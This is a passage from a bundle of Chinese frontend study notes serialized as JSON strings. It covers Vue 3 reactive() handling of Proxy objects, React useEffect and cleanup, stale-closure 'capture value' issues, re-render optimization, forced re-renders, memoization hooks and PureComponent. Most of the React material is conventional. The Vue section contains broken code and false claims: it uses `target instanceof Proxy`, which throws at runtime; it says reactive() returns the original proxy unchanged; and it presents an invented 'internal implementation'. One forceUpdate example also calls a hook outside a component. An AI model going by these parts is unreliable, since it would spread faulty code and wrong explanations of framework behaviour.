return target\n  }\n\n  // 关键点：如果目标已经是响应式对象（Proxy），直接返回\n  if (target.__v_raw && !(target instanceof Proxy)) {\n    return target\n  }\n  \n  // 防止同一对象被重复代理\n  const existingProxy = proxyMap.get(target)\n  if (existingProxy) {\n    return existingProxy\n  }\n\n  // 创建代理\n  const proxy = new Proxy(target, baseHandlers)\n  proxyMap.set(target, proxy)\n  return proxy\n}\n```\n\n### 8.3. 实际使用示例\n\n#### 8.3.1. 基本 Proxy 对象\n\n```javascript\n// 1. 普通 Proxy\nconst originalProxy = new Proxy({}, {\n  get(target, key) {\n    console.log('原始 Proxy get:', key)\n    return target[key]\n  }\n})\n\n// 2. Vue reactive\nconst reactiveProxy = reactive(originalProxy)\n\n// 3. 验证是否是同一个对象\nconsole.log(reactiveProxy === originalProxy) // true\n```\n\n#### 8.3.2. 嵌套 Proxy 情况\n\n```javascript\n// 嵌套的 Proxy 对象\nconst nestedProxy = new Proxy({\n  nested: new Proxy({}, {\n    get(target, key) {\n      console.log('嵌套 Proxy get:', key)\n      return target[key]\n    }\n  })\n}, {\n  get(target, key) {\n    console.log('外层 Proxy get:', key)\n    return target[key]\n  }\n})\n\n// Vue reactive 会保持原有的 Proxy 行为\nconst reactiveNested = reactive(nestedProxy)\n```\n\n### 8.4. 特殊场景处理\n\n#### 8.4.1. 自定义 Proxy 行为保持\n\n```javascript\nconst customProxy = new Proxy({}, {\n  get(target, key) {\n    console.log('自定义 get')\n    return target[key]\n  },\n  set(target, key, value) {\n    console.log('自定义 set')\n    target[key] = value\n    return true\n  }\n})\n\n// Vue reactive 会保持原有的自定义行为\nconst reactiveCustom = reactive(customProxy)\n```\n\n#### 8.4.2. 带有内部状态的 Proxy\n\n```javascript\nlet internalState = {}\n\nconst stateProxy = new Proxy({}, {\n  get(target, key) {\n    // 访问内部状态\n    return internalState[key] || target[key]\n  },\n  set(target, key, value) {\n    // 更新内部状态\n    internalState[key] = value\n    target[key] = value\n    return true\n  }\n})\n\n// Vue reactive 处理时会保持内部状态\nconst reactiveState = reactive(stateProxy)\n```\n\n### 8.5. 实现原理解析\n\n#### 8.5.1. 检测机制\n\n```javascript\n// Vue 3 内部实现（简化版）\nfunction isReactive(value) {\n  return !!(value && value.__v_isReactive)\n}\n\nfunction reactive(target) {\n  // 已经是响应式对象\n  if (isReactive(target)) {\n    return target\n  }\n\n  // 创建新的响应式对象\n  return createReactiveObject(\n    target,\n    false,\n    mutableHandlers,\n    mutableCollectionHandlers\n  )\n}\n```\n\n#### 8.5.2. Proxy 处理器\n\n```javascript hl:15,23\n// 基础处理器\nconst baseHandlers = {\n  get(target, key, receiver) {\n    // 如果访问特殊标记，返回true\n    if (key === '__v_isReactive') {\n      return true\n    }\n    \n    // 如果目标自身是 Proxy，保持其行为\n    if (target instanceof Proxy) {\n      return Reflect.get(target, key, receiver)\n    }\n    \n    const res = Reflect.get(target, key, receiver)\n    track(target, 'get', key)\n    return res\n  },\n  \n  set(target, key, value, receiver) {\n    const oldValue = target[key]\n    const result = Reflect.set(target, key, value, receiver)\n    if (hasChanged(value, oldValue)) {\n      trigger(target, 'set', key, value, oldValue)\n    }\n    return result\n  }\n}\n```\n\n### 8.6. 最佳实践\n\n#### 8.6.1. 避免重复代理\n\n```javascript\n// ❌ 不好的做法\nconst proxy1 = new Proxy({}, {/*...*/})\nconst proxy2 = reactive(proxy1)\nconst proxy3 = reactive(proxy2)\n\n// ✅ 好的做法\nconst proxy = reactive(new Proxy({}, {/*...*/}))\n```\n\n#### 8.6.2. 保持代理一致性\n\n```javascript\n// 推荐的做法\nconst state = reactive({\n  data: new Proxy({}, {\n    get(target, key) {\n      // 自定义获取逻辑\n      return target[key]\n    }\n  })\n})\n\n// 使用时保持引用一致性\nconst { data } = state\n```\n\n#### 8.6.3. 处理复杂代理场景\n\n```javascript\n// 创建复杂的响应式状态\nconst complexState = reactive({\n  proxy: new Proxy({}, {\n    get(target, key) {\n      // 复杂的获取逻辑\n      return target[key]\n    }\n  }),\n  data: {\n    value: 1\n  }\n})\n\n// 访问和修改\nconsole.log(complexState.proxy.someKey)\ncomplexState.data.value = 2\n```\n\n记住，Vue 3 的响应式系统设计考虑了 Proxy 对象的特殊情况，会智能地处理已经是 Proxy 的对象，避免重复代理，同时保持原有的代理行为。在实际开发中，我们应该避免创建不必要的多层代理，保持代码的简洁性和可维护性。\n\n## 9. 最后\n\nOK，就到这儿吧，其实已经有一个很现成的库供我们使用了，如果某一天真正需要用到，或者需要仔细研究，那么去看看 `@vue/reactivity` \n\n","FjQZRrxK":"\n# 前言\n\n`#react` \n\n> React 相关\n\n\n\n\n","cAbCMDvC":"\n# useEffect\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 依赖数组\n\t- 不传，每次渲染都执行\n\t- 空数组，仅在挂载时执行\n\t- 正常传，仅在变化时执行\n- 执行顺序说明：正常顺序是==渲染后再执行副作用函数==\n\t- **挂载时**：\n\t\t1. 渲染组件\n\t\t2. 执行 effect \n\t\t\t- 组件渲染后才会执行 `useEffect`\n\t\t\t- 和 `useLayoutEffect` 有区别\n\t- **更新时**：\n\t\t1. 渲染组件\n\t\t2. 执行上一次的**清理函数**\n\t\t3. 执行新的 `effect`\n\t- **卸载时**：\n\t\t1. 执行清理函数\n\t\t2. 移除组件\n\n## 2. 基本概念\n\n`useEffect` 是 React 中用于处理副作用的 Hook。`副作用`包括：\n- 数据获取（API 调用）\n- 订阅\n- DOM 手动修改\n\t- 修改标题\n- 事件监听\n- 定时器\n- 日志记录等\n\n## 3. 基本语法\n\n```jsx hl:5\nuseEffect(() => {\n  // 副作用代码\n  \n  return () => {\n    // 清理函数\n  };\n  \n}, [dependencies]);\n```\n\n## 4. 示例\n\n通过几个具体的例子来说明 `useEffect` 的不同使用场景：\n\n1. 基础效果：每次 count 改变时执行\n2. 模拟数据获取\n3. 事件监听器示例\n4. 定时器示例\n\n````jsx hl:9,30,44,56,9,15,32,46\nimport React, { useState, useEffect } from \"react\";\n\nconst EffectExamples = () => {\n  const [count, setCount] = useState(0);\n  const [data, setData] = useState(null);\n  const [windowWidth, setWindowWidth] = useState(window.innerWidth);\n  const [timer, setTimer] = useState(0);\n\n  // 1. 基础效果：每次 count 改变时执行\n  useEffect(() => {\n    console.log(\"Count changed:\", count);\n    document.title = `Count is ${count}`;\n  }, [count]);\n\n  // 2. 模拟数据获取\n  useEffect(() => {\n    const fetchData = async () => {\n      try {\n        // 模拟 API 调用\n        const response = await new Promise((resolve) =>\n          setTimeout(() => resolve({ data: \"模拟数据\" }), 1000),\n        );\n        setData(response.data);\n      } catch (error) {\n        console.error(\"Error fetching data:\", error);\n      }\n    };\n\n    fetchData();\n  }, []); // 空依赖数组，只在组件挂载时执行一次\n\n  // 3. 事件监听器示例\n  useEffect(() => {\n    const handleResize = () => {\n      setWindowWidth(window.innerWidth);\n    };\n\n    window.addEventListener(\"resize\", handleResize);\n\n    // 清理函数\n    return () => {\n      window.removeEventListener(\"resize\", handleResize);\n    };\n  }, []); // 空依赖数组，但包含清理函数，只在组件挂载时执行一次\n\n  // 4. 定时器示例\n  useEffect(() => {\n    const intervalId = setInterval(() => {\n      setTimer((prev) => prev + 1);\n    }, 1000);\n\n    // 清理函数\n    return () => {\n      clearInterval(intervalId);\n    };\n  }, []); // 空依赖数组，但包含清理函数，只在组件挂载时执行一次\n\n  return (\n    <div className=\"p-4 space-y-4\">\n      <div className=\"border p-4 rounded\">\n        <h2 className=\"text-xl mb-2\">计数器效果</h2>\n        <p>当前计数: {count}</p>\n        <button\n          className=\"bg-blue-500 text-white px-4 py-2 rounded\"\n          onClick={() => setCount((c) => c + 1)}\n        >\n          增加计数\n        </button>\n      </div>\n\n      <div className=\"border p-4 rounded\">\n        <h2 className=\"text-xl mb-2\">数据获取效果</h2>\n        <p>获取的数据: {data || \"加载中...\"}</p>\n      </div>\n\n      <div className=\"border p-4 rounded\">\n        <h2 className=\"text-xl mb-2\">窗口大小监听</h2>\n        <p>当前窗口宽度: {windowWidth}px</p>\n      </div>\n\n      <div className=\"border p-4 rounded\">\n        <h2 className=\"text-xl mb-2\">定时器效果</h2>\n        <p>计时器: {timer}秒</p>\n      </div>\n    </div>\n  );\n};\nexport default EffectExamples;\n````\n\n## 5. 依赖数组的使用规则\n\n### 5.1. **空依赖数组 `[]`**\n\n- 效果**只在组件挂载时执行一次**\n\n   ```jsx\nuseEffect(() => {\n console.log('组件挂载');\n}, []);\n   ```\n\n### 5.2. **有依赖的数组 `[dep1, dep2]`**\n\n- 当依赖项改变时执行\n   ```jsx\nuseEffect(() => {\n\tconsole.log('依赖项改变');\n}, [dep1, dep2]);\n   ```\n\n#### 5.2.1. **没有依赖数组**\n\n- **每次渲染都执行**\n\n```jsx\nuseEffect(() => {\n\tconsole.log('每次渲染');\n});\n```\n\n## 6. 清理函数（Cleanup）\n\nuseEffect 的清理函数（Cleanup Function）有几个重要的执行时机，让我通过具体示例来详细说明：\n\n### 6.1. **组件卸载时**\n\n```jsx\nuseEffect(() => {\n  console.log('组件挂载');\n  return () => {\n    console.log('组件卸载时执行清理'); // 当组件被移除时执行\n  };\n}, []);\n```\n\n- 当组件被完全从 DOM 中移除时执行\n- 适用于清理订阅、定时器等持久性的副作用\n\n### 6.2. **依赖项变化时**\n\n```jsx\nuseEffect(() => {\n  console.log(`count 值: ${count}`);\n  return () => {\n    // 在下一次 effect 执行前，会先执行上一次的清理函数\n    console.log(`清理 count 旧值: ${count}`);\n  };\n}, [count]);\n```\n\n执行顺序：\n\n1. 首次渲染：\n\t1. 执行 effect\n2. count 更新时：\n   - **先执行**上一次的清理函数\n   - 然后执行新的 effect\n\n> 和 Vue 的 watch 是不是很像\n> 这样能够规避**竞态问题**\n\n### 6.3. **每次重新渲染时**\n\n```jsx\nuseEffect(() => {\n  console.log('渲染后执行');\n  return () => {\n    console.log('下一次渲染前执行清理');\n  };\n}); // 没有依赖数组，每次都重新渲染\n```\n\n- **每次组件重新渲染都会触发**\n- **清理函数在下一次渲染前执行**\n\n### 6.4. **常见的清理场景**\n\n#### 6.4.1. **清理定时器**\n\n```jsx\nuseEffect(() => {\n  const timer = setInterval(() => {\n    // 定时器逻辑\n  }, 1000);\n\n  return () => {\n    // 防止内存泄漏\n    clearInterval(timer); \n  };\n}, []);\n```\n\n#### 6.4.2. **取消事件监听**\n\n```jsx\nuseEffect(() => {\n  const handleScroll = () => {\n    // 滚动处理逻辑\n  };\n  window.addEventListener('scroll', handleScroll);\n\n  return () => {\n    window.removeEventListener('scroll', handleScroll);\n  };\n}, []);\n```\n\n#### 6.4.3. **取消订阅**\n\n```jsx\nuseEffect(() => {\n  const subscription = someService.subscribe();\n  return () => {\n    subscription.unsubscribe();\n  };\n}, []);\n```\n\n### 6.5. **执行顺序的重要说明**\n\n- **挂载时**：\n\t  1. 渲染组件\n\t  2. 执行 effect \n\t  \t  - 组件渲染后才会执行 `useEffect`\n\t  \t  - 和 `useLayoutEffect` 有区别）\n- **更新时**：\n\t  1. 渲染组件\n\t  2. 执行上一次的**清理函数**\n\t  3. 执行新的 `effect`\n- **卸载时**：\n\t  1. 执行清理函数\n\t  2. 移除组件\n\n## 7. 常见陷阱和注意事项\n\n### 7.1. **闭包陷阱**\n\n```jsx\nconst [count, setCount] = useState(0);\nuseEffect(() => {\n  const timer = setInterval(() => {\n    // 这里的 count 永远是初始值 0\n    // 这里的 count 会被\"闭包\"捕获\n    console.log(count);\n  }, 1000);\n\n  return () => clearInterval(timer);\n}, []); \n\n// 即使后续 count 更新到 1, 2, 3... \n// 定时器中的闭包仍然引用着最初的 count 值\n```\n\n#### 7.1.1. 解决方案1：添加 `count` 作为依赖\n\n```javascript hl:7\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log(count); // 现在会正确输出最新的 count\n  }, 1000);\n\n  return () => clearInterval(timer);\n}, [count]); // 添加 count 作为依赖\n\n```\n\n#### 7.1.2. 解决方案 2：使用`函数更新形式`\n\n```javascript hl:3\nuseEffect(() => {\n  const timer = setInterval(() => {\n    setCount(c => c + 1); // 使用函数式更新，不需要依赖 count\n  }, 1000);\n\n  return () => clearInterval(timer);\n}, []); // 空依赖数组是安全的\n\n```\n\n#### 7.1.3. 解决方案 3：使用 `useRef` \n\n```javascript hl:1,9\nconst countRef = useRef(count);\n\nuseEffect(() => {\n  countRef.current = count; // 更新 ref\n}, [count]);\n\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log(countRef.current); // 总是能获取最新值\n  }, 1000);\n\n  return () => clearInterval(timer);\n}, []);\n```\n\n### 7.2. **清理函数的返回值**\n\n```jsx hl:2,6\nuseEffect(() => {\n  // 清理函数必须返回 undefined\n  return () => {\n    // 清理逻辑\n  };\n  // 不要返回其他值\n}, []);\n```\n\n### 7.3. **异步清理函数**\n\n```jsx hl:2,9\nuseEffect(() => {\n  // 清理函数不能是异步的\n  return () => {\n    // 这是正确的\n    cleanup();\n  };\n\n  // 这是错误的\n  // return async () => {\n  //   await cleanup();\n  // };\n}, []);\n```\n\n### 7.4. **无限循环**\n\n```jsx\n// 错误示例\nuseEffect(() => {\n  setCount(count + 1); // 这会导致无限循环\n}, [count]);\n```\n\n### 7.5. **竞态条件**\n\n> 见下面\n\n### 7.6. **依赖项处理**\n\n需要**包含所有使用的外部变量**，如下：\n\n```jsx\n// 正确的依赖项处理\nuseEffect(() => {\n  const handler = (e) => {\n    if (e.key === 'Enter') {\n      callback();\n    }\n  };\n  \n  window.addEventListener('keydown', handler);\n  return () => window.removeEventListener('keydown', handler);\n}, [callback]); // 包含所有使用的外部变量\n```\n\n## 8. 使用场景总结\n\n- **数据获取**\n\t- API 调用\n\t- 数据订阅\n- **DOM 操作**\n\t- 修改标题\n\t- 管理焦点\n\t- 操作 canvas\n- **订阅/监听**\n\t- 事件监听\n\t- WebSocket 连接\n\t- 第三方库订阅\n- **定时任务**\n\t- 定时器\n\t- 轮询\n- **与其他系统集成**\n\t- 第三方库初始化\n\t- 外部系统同步\n\n## 9. useEffect 中的竞态条件（Race Condition）问题\n\n竞态条件是指当多个异步操作的结果以不可预测的顺序返回时可能导致的问题。\n\n### 9.1. **问题场景**\n\n```jsx\n// 有问题的代码\nuseEffect(() => {\n  const fetchData = async () => {\n    const data = await fetchUserData(userId);\n    setUserData(data); // 可能设置错误的数据\n  };\n  fetchData();\n}, [userId]);\n```\n\n问题在于：\n- 用户`快速切换 userId`（比如连续点击按钮）\n- 多个请求被发出，但返回顺序不确定\n- 可能后发出的请求先返回，而先发出的请求后返回\n- 导致显示的是旧的请求结果，而不是最新的\n\n### 9.2. **基本解决方案**\n\n```jsx\nuseEffect(() => {\n  let isMounted = true;\n\n  const fetchData = async () => {\n    const data = await fetchUserData(userId);\n    if (isMounted) {\n      setUserData(data);\n    }\n  };\n\n  fetchData();\n\n  return () => {\n    isMounted = false;\n  };\n}, [userId]);\n```\n\n这个方案：\n\n- 使用 `isMounted` 标志追踪组件是否仍然挂载\n- 在设置状态前检查组件是否仍然挂载\n- 在`清理函数`中将标志设为 `false`\n\n### 9.3. **最佳实践方案（使用 AbortController）**\n\n```jsx hl:20\nuseEffect(() => {\n\n  const abortController = new AbortController();\n\n  const fetchData = async () => {\n    try {\n      const data = await fetchUserData(userId);\n      if (!abortController.signal.aborted) {\n        setUserData(data);\n      }\n    } catch (error) {\n      if (!abortController.signal.aborted) {\n        setError(error);\n      }\n    }\n  };\n\n  fetchData();\n\n  return () => {\n    abortController.abort();\n  };\n}, [userId]);\n```\n\n这个方案的优点：\n- 可以**真正取消进行中**的请求\n- 更好的错误处理\n- 更完整的状态管理（`loading`、`error` 状态）\n\n### 9.4. **其他解决方案**\n\n#### 9.4.1. 使用防抖/节流\n\n```jsx\nimport { debounce } from 'lodash';\nuseEffect(() => {\n  const debouncedFetch = debounce(async () => {\n    const data = await fetchUserData(userId);\n    setUserData(data);\n  }, 300);\n  debouncedFetch();\n  return () => {\n    debouncedFetch.cancel();\n  };\n}, [userId]);\n```\n\n#### 9.4.2. 使用数据获取库：useQuery\n\n```jsx\n// 使用 React Query\nconst { data, isLoading } = useQuery(\n  ['user', userId],\n  () => fetchUserData(userId)\n);\n```\n\n### 9.5. **最佳实践建议**\n\n- 始终实现清理函数\n- **始终返回清理函数来防止内存泄漏**\n- 确保清理函数清理了所有副作用\n- 在开发时使用 **React DevTools** 检查是否有遗漏的清理\n- 使用 `ESLint` 的 `exhaustive-deps 规则`确保依赖项正确\n- 测试组件的挂载、更新和卸载场景\n- 考虑使用 `AbortController` 取消请求\n- 适当的错误处理\n- 考虑使用专门的数据获取库（如 `React Query, SWR`）\n- 实现加载状态和错误状态\n- 考虑使用`防抖/节流`来限制请求频率\n","Gc3wXczi":"\n# React 的 Capture Value（捕获值）特性与解决方案\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 什么是 Capture Value。\n- 定时器问题和事件处理器问题是常见的 Capture Value 问题\n- 使用函数式更新可以解决定时器问题\n- 解决方案\n\t- 使用 useRef 可以保存最新值\n\t- 正确使用依赖数组可以确保取到最新值\n\t- 使用 useReducer 的 dispatch 永远是稳定的,不需要依赖\n\t- 自定义 useLatest Hook 可以保存最新值\n\t- 使用 useCallback 或 useMemo 可以处理 Capture Value 问题\n\n## 2. 什么是 Capture Value\n\nCapture Value 是指：\n- React 的函数组件在**每次渲染时都会捕获当前渲染时的 props 和 state 值**。\n- 每次渲染**都有自己的事件处理函数，这些函数会\"记住\"当时的值**。\n\n### 2.1. 表现\n\n![图片&文件](./files/20241030.png)\n\n```jsx hl:6\nimport React, { useState } from \"react\";\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  // 点击按钮，3 秒后弹出当前 count 值\n  // 但是由于 setTimeout 是异步的，所以会捕获当时的 count 值\n  const handleClick = () => {\n    setTimeout(() => {\n      alert(count); // 会捕获当时的 count 值\n    }, 3000);\n  };\n\n  return (\n    <div>\n      <p>当前计数: {count}</p>\n      <button onClick={() => setCount(count + 1)}>+1</button>\n      <button onClick={handleClick}>显示计数</button>\n    </div>\n  );\n}\n\nexport default Counter;\n\n```\n\n## 3. 常见的 Capture Value 问题\n\n### 3.1. 定时器问题\n\n```jsx\nfunction Timer() {\n  const [count, setCount] = useState(0);\n  \n  // ❌ 问题示例\n  useEffect(() => {\n    const timer = setInterval(() => {\n      setCount(count + 1); // count 被捕获，永远是初始值\n    }, 1000);\n    \n    return () => clearInterval(timer);\n  }, []); // 空依赖数组\n}\n```\n\n### 3.2. 事件处理器问题\n\n```jsx\nfunction EventHandler() {\n  const [message, setMessage] = useState('');\n  \n  // ❌ 问题示例\n  const handleClick = useCallback(() => {\n    console.log(message); // 总是打印旧值\n  }, []); // 空依赖数组\n}\n```\n\n## 4. 常见的解决方案\n\n### 4.1. 使用函数式更新\n\n```jsx\nfunction Timer() {\n  const [count, setCount] = useState(0);\n  \n  // ✅ 使用函数式更新\n  useEffect(() => {\n    const timer = setInterval(() => {\n      setCount(c => c + 1); // 不依赖外部的 count\n    }, 1000);\n    \n    return () => clearInterval(timer);\n  }, []); // 空依赖数组是安全的\n}\n```\n\n### 4.2. 使用 useRef\n\n```jsx\nfunction Component() {\n  const [value, setValue] = useState('');\n  const valueRef = useRef(value);\n  \n  // 更新 ref\n  useEffect(() => {\n    valueRef.current = value;\n  }, [value]);\n  \n  // ✅ 使用 ref 访问最新值\n  const handleAsync = useCallback(() => {\n    setTimeout(() => {\n      console.log(valueRef.current); // 总是能获取最新值\n    }, 1000);\n  }, []);\n}\n```\n\n### 4.3. 正确使用依赖数组\n\n> 传入的值总能保证是最新的\n\n```jsx\nfunction SearchComponent({ onSearch }) {\n  const [query, setQuery] = useState('');\n  \n  // ✅ 添加必要的依赖\n  const search = useCallback(() => {\n    onSearch(query);\n  }, [query, onSearch]);\n}\n```\n\n### 4.4. 使用 useReducer\n\n>  dispatch 永远是稳定的，不需要依赖\n\n```jsx hl:16,13\nfunction reducer(state, action) {\n  switch (action.type) {\n    case 'increment':\n      return { count: state.count + 1 };\n    default:\n      return state;\n  }\n}\n\nfunction Counter() {\n  const [state, dispatch] = useReducer(reducer, { count: 0 });\n  \n  // ✅ dispatch 永远是稳定的，不需要依赖\n  useEffect(() => {\n    const timer = setInterval(() => {\n      dispatch({ type: 'increment' });\n    }, 1000);\n    \n    return () => clearInterval(timer);\n  }, []);\n}\n```\n\n### 4.5. 使用 useLatest 自定义 Hook\n\n#### 4.5.1. 定义 Hooks：使用 useRef \n\n```jsx\nfunction useLatest(value) {\n  const ref = useRef(value);\n  \n  useEffect(() => {\n    ref.current = value;\n  }, [value]);\n  \n  return ref;\n}\n\n```\n\n#### 4.5.2. 使用\n\n```javascript\nfunction Component() {\n  const [value, setValue] = useState('');\n  const latestValue = useLatest(value);\n  \n  const handleAsync = useCallback(() => {\n    setTimeout(() => {\n      console.log(latestValue.current);\n    }, 1000);\n  }, []);\n}\n```\n\n### 4.6. 使用 useCallback 或 useMemo 来处理 Capture Value\n\n```javascript hl:4\nfunction Example() {\n  const [count, setCount] = useState(0);\n  \n  // 每次 count 改变时都会创建新的回调\n  const handleClick = useCallback(() => {\n    console.log(`Count is: ${count}`);\n  }, [count]);\n  \n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n      <button onClick={handleClick}>Log count</button>\n    </div>\n  );\n}\n```\n\n","AMYFOt6i":"\n# React 重新渲染的场景以及对应的优化方案\n\n\n`#React` \n\n\n## 目录\n<!-- toc -->\n ## 1. 重复渲染场景及解决思路 \n\n- ==State 变化==触发重新渲染\n\t- 合并状态更新\n\t- 使用 `useReducer` 管理复杂状态\n- ==Props 变化==触发子组件重新渲染\n\t- 使用 React.memo 包装组件\n\t- 使用 useMemo 缓存计算属性\n\t- 使用 useCallback 缓存==回调函数==\n- 父组件重新渲染导致子组件重新渲染\n\t- 组件拆分，将变化部分隔离\n\t- 使用 React.memo 阻止不必要的重新渲染\n- Context 变化触发消费组件重新渲染\n\t- 拆分 Context\n\t- 使用 useMemo 缓存 Context 值\n- 列表渲染优化\n\t- 使用稳定的 key\n\t- 虚拟列表： \n\t\t- 虚拟列表（react-window 或 react-virtualized）\n\t- 分页或无限滚动\n- 事件处理函数优化，==每次渲染都创建新的函数==\n\t- 使用 useCallback\n\t- 使用 ref 存储函数，这是静态的，就不会每次都创建新函数\n- 异步操作和副作用优化\n\t- 使用 `AbortController` 取消请求\n\t- 使用缓存\n\t- 考虑使用 React Query 或 SWR 等数据管理库\n- 强制重新渲染：\n\t- `const [, forceUpdate] = useReducer(x => x + 1, 0);`\n\n## 2. 总结：关键优化思路\n\n1. 减少渲染范围\n    - 状态下移\n    - 组件拆分\n    - 使用 React.memo\n2. 稳定化数据和回调\n    - useCallback\n    - useMemo\n    - useReducer\n    - 提取静态数据\n        - 使用 useRef 存储静态数据，他不会导致重新渲染\n3. 优化数据流\n    - 合理的状态管理\n    - Context 拆分\n    - 批量更新\n4. 性能监测：\n    - React DevTools Profiler\n    - 性能监控\n    - 代码分割\n\n## 3. 使用 React DevTools 分析渲染\n\n```jsx\n// 使用 React Profiler 组件包裹需要分析的部分\nfunction App() {\n  return (\n    <Profiler id=\"App\" onRender={onRenderCallback}>\n      <YourComponent />\n    </Profiler>\n  );\n}\n\nfunction onRenderCallback(\n  id, // 发生提交的 Profiler 树的 \"id\"\n  phase, // \"mount\" （首次渲染）或 \"update\" （重新渲染）\n  actualDuration, // 本次更新花费的渲染时间\n  baseDuration, // 估计不使用 memoization 的情况下渲染整颗子树需要的时间\n  startTime, // 本次更新开始渲染的时间\n  commitTime, // 本次更新被提交的时间\n  interactions // 属于本次更新的 interactions 的集合\n) {\n  // 在这里进行性能分析\n}\n```","BcHSEuwG":"\n# 强制重新渲染有哪些方式\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 自定义 useForceUpdate\n- useReducer 中的 forceUpdate\n- useState 切换布尔值达到类似效果\n- 变更 key →  完全卸载并重新挂载组件\n\n>  强制更新应该作为**一种例外情况下的解决方案**，而不是常规做法\n\n## 2. 自定义 Hook： `useForceUpdate` \n\n这是一种常见的模式，可以创建一个自定义 Hook 来强制组件重新渲染：\n\n```javascript\nimport { useState, useCallback } from 'react';\n\nfunction useForceUpdate() {\n  const [, setState] = useState({});\n  return useCallback(() => setState({}), []);\n}\n\n// 使用方式\nfunction MyComponent() {\n  const forceUpdate = useForceUpdate();\n  \n  const handleClick = () => {\n    // 进行一些操作\n    forceUpdate();\n  };\n\n  return <button onClick={handleClick}>Force Update</button>;\n}\n```\n\n这种方法通过**更新一个空对象**来触发重新渲染\n\n## 3. 使用 `useReducer`\n\n`useReducer` 也可以用来强制更新，有一个 `forceUpdate`\n\n```javascript\nimport { useReducer } from 'react';\n\nconst [, forceUpdate] = useReducer(x => x + 1, 0);\n\n// 使用方式\nfunction MyComponent() {\n  const handleClick = () => {\n    // 进行一些操作\n    forceUpdate();\n  };\n\n  return <button onClick={handleClick}>Force Update</button>;\n}\n```\n\n这种方法通过递增一个计数器来触发重新渲染 \n\n## 4. 使用 `useState`\n\n简单地使用 `useState` 也可以达到强制更新的效果：\n\n```javascript\nimport { useState } from 'react';\n\nfunction MyComponent() {\n  const [, setToggle] = useState(false);\n\n  const handleClick = () => {\n    // 进行一些操作\n    setToggle(prev => !prev);\n  };\n\n  return <button onClick={handleClick}>Force Update</button>;\n}\n```\n\n这种方法通过==切换一个布尔值==来触发重新渲染 \n\n## 5. 使用 `key` 属性\n\n对于整个组件的强制更新，可以使用 `key` 属性：\n\n```jsx\nfunction ParentComponent() {\n  const [key, setKey] = useState(0);\n\n  const handleReset = () => {\n    setKey(prevKey => prevKey + 1);\n  };\n\n  return (\n    <>\n      <button onClick={handleReset}>Reset Component</button>\n      <MyComponent key={key} />\n    </>\n  );\n}\n```\n\n通过改变 `key` 值，React 会==完全卸载并重新挂载组件==，相当于强制重新渲染 \n\n","QBXOxT25":"\n# React.memo 、 useMemo 、 useCallback 对比\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- React.memo 是一个==高阶组件(HOC)==，用于==组件级别的缓存==\n\t- 可接受第二个参数：自定义比较函数\n- useMemo 用于==缓存==计算结果\n- useCallback 用于缓存 函数\n\n## 2. React.useCallback 和 useCallback\n\n实际上它们是完全一样的！这只是引用方式的不同：\n\n```javascript\n// 方式 1：从 React 对象中解构\nimport { useCallback } from 'react';\nconst memoizedFn = useCallback(() => {}, []);\n\n// 方式 2：通过 React 对象调用\nimport React from 'react';\nconst memoizedFn = React.useCallback(() => {}, []);\n```\n\n两种方式功能完全相同，都是用来缓存函数的 Hook。选择哪种方式主要取决于你的代码风格和项目约定。\n\n## 3. React.memo 和 useMemo 的区别\n\n### 3.1. React.memo\n\nReact.memo 是一个**高阶组件(HOC)**，用于**组件级别的缓存**：\n\n```javascript hl:12\n// React.memo 示例\nconst MyComponent = React.memo(function MyComponent(props) {\n  /* 渲染逻辑 */\n  return (\n    <div>\n      <h1>{props.name}</h1>\n      <p>{props.description}</p>\n    </div>\n  );\n});\n\n// 可以添加第二个参数：可以添加自定义比较函数\nconst MyComponent = React.memo(function MyComponent(props) {\n  /* 渲染逻辑 */\n}, (prevProps, nextProps) => {\n  // 返回 true 则不重新渲染，返回 false 则重新渲染\n  return prevProps.name === nextProps.name;\n});\n```\n\n#### 3.1.1. 主要特点\n\n- 用于优化函数组件的重渲染\n- 对比 props 变化，决定是否重新渲染组件\n- 是一个高阶组件，包裹整个组件\n- 适用于纯展示型组件的优化\n\n### 3.2. useMemo\n\nuseMemo 是一个 Hook，用于缓存计算结果：\n\n```javascript\n// useMemo 示例\nfunction MyComponent() {\n  const [count, setCount] = useState(0);\n  const [text, setText] = useState('');\n\n  // 缓存计算结果\n  const expensiveValue = useMemo(() => {\n    return computeExpensiveValue(count);\n  }, [count]);\n\n  // 缓存对象\n  const memoizedObject = useMemo(() => ({\n    id: count,\n    text: text\n  }), [count, text]);\n\n  return (\n    <div>\n      <p>Computed value: {expensiveValue}</p>\n      <ChildComponent data={memoizedObject} />\n    </div>\n  );\n}\n```\n\n主要特点：\n\n- 用于缓存计算结果或值\n- 只在依赖项改变时重新计算\n- 是一个 Hook，在组件内部使用\n- 适用于昂贵的计算或防止对象引用变化\n\n### 3.3. 总结\n\n1. React.memo 适用于减少组件重渲染\n2. useMemo 适用于缓存计算结果或对象引用\n3. 不要过度优化，只在性能问题明显时使用\n4. 配合 React DevTools 进行性能分析","zSeYNzez":"\n# PureComponent\n\n`#react`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- PureComponent 自动实现了 `shouldComponentUpdate`\n\t- 支持所有常规的 React 生命周期方法\n- Component vs PureComponent\n\t- PureComponent：\n\t\t- 会对 props 和 state 进行==浅比较==，只有在数据真正发生变化时才重新渲染\n\t- Component：\n\t\t- 默认情况下，只要父组件重新渲染，组件就会重新渲染\n- 可使用 ==React.memo== 来实现类似 PureComponent 的功能\n\t- 因为它也接受第二个参数\n- 一些注意点\n\t- 对象属性尽量单独提出，比如 style，每次渲染都创建新对象\n\t\t- 建议，将对象提到组件外部或使用 useMemo\n\t- 数组属性使用 map 时，会新建数组\n\t- 函数属性不要内联\n\t\t- 内联函数会导致 PureComponent 失效\n\n## 2. PureComponent 的定义\n\nPureComponent 是 React 提供的一个基础组件类，它自动实现了 `shouldComponentUpdate` 生命周期方法，通`过浅比较（shallow comparison）props 和 state` 来决定是否需要重新渲染组件\n\nPureComponent **完全支持所有常规的 React 生命周期方法**。\n- 它主要通过自动实现 `shouldComponentUpdate()` 来优化性能，但不会限制你使用其他生命周期钩子。\n\n## 3. PureComponent vs 